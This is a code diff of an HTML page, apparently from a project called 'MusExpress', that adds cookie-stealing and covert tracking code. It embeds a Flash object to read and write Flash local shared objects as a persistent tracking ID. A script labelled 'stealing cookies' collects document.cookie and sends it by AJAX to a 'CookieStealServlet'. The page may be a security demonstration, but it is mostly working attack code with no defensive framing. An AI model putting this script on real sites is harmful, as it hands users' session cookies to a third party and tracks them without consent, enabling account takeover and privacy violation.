@@ -1,44 +1,93 @@
 <!DOCTYPE html>
 <html>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<cross-domain-policy>
+    <allow-access-from domain="www.domain-of-swf.com" />
+</cross-domain-policy>
+<head>
+<script type="text/javascript"
+	src="/MusExpress/js/lib/jquery-3.1.1.min.js"></script>
+</head>
 <body>
 	<img src="../images/loader.gif">
 	<script>
 	/*
 	*web tracking with Flah FLOs
 	*/
+	var lso_value;
 	
+	 
+	function init() {
+	    var so = new swfobject.embedSWF("pd_check.swf", "pd_check", "1", "1", "9.0.0");
+	    so.write("flash_container");
+	}
+	 
+	function getFlashMovie( movieName ) {
+	    var isIE = navigator.appName.indexOf("Microsoft") != -1;
+	    return (isIE) ? window[movieName] : document[movieName];
+	}
+	 
+	function requestLSOValue() {
+	    getFlashMovie('pd_check').requestLSOValue();
+	}
+	 
+	function updateLSOValue( value ) {
+	    lso_value = value;
+	}
+	 
+	function setLSOValue( value ) {
+	    getFlashMovie('pd_check').setLSOValue( value );
+	}
 	//get FLOS
 	//transform FLOS into cookies
-	
-	var _local2 = flash.external.ExternalInterface.call(�getCookie�, �guid�);
-		console.log(_local2);
-	if (_local2 == undefined) {
-		_local2 = getComputerguidFromFSO();
-		console.log(_local2);
-		if (_local2 != undefined) {
-			flash.external.ExternalInterface.call(�setCookie�,�guid�, _local2);
-			console.log(document.cookie("guid"));
+	/*
+	var local2 = ExternalInterface.call('getCookie', 'guid');
+		console.log(local2);
+	if (local2 == undefined) {
+		local2 = getComputerguidFromFSO();
+		console.log(local2);
+		if (local2 != undefined) {
+			flash.external.ExternalInterface.call('setCookie','guid', local2);
+			console.log(document.cookie);
 		}	
 	}
 	else {
-		setComputerguidInFSO(_local2);
+		setComputerguidInFSO(local2);
 		}
+	*/
 	/*
 	*stealing cookies
 	*/
-	console.log('cookie: ' + document.cookie);
+	function setCookie(cname, cvalue, exdays) {
+	    var d = new Date();
+	    d.setTime(d.getTime() + (exdays*24*60*60*1000));
+	    var expires = "expires="+ d.toUTCString();
+	    document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
+	} 
+	setCookie("test","testSansHttpOnly",2);
 	//copie cookies into variable cookies
 	var cookies = document.cookie;
-	
+	console.log('cookie: ' + cookies);
+
+	function listCookies() {
+	    var theCookies = document.cookie.split(';');
+	    var aString = '';
+	    for (var i = 1 ; i <= theCookies.length; i++) {
+	        aString += i + ' ' + theCookies[i-1] + "\n";
+	    }
+	    return aString;
+	}
 	//sends cookies to MusExpress server
 	$.ajax({
 		type : "GET",
-		url : "CookieStealServlet", //add complete URL
+		url : "../CookieStealServlet", //add complete URL
 		data : cookies,
 	
 		dataType : "json",
-		success : function(data) {�
+		success : function(data) { 
 			console.log(data.message);
+			console.log(data.cookies);
+			console.log('after cookie: ' +  listCookies());
 		},
 		error : function(XHR, testStatus, errorThrown) 
 		{
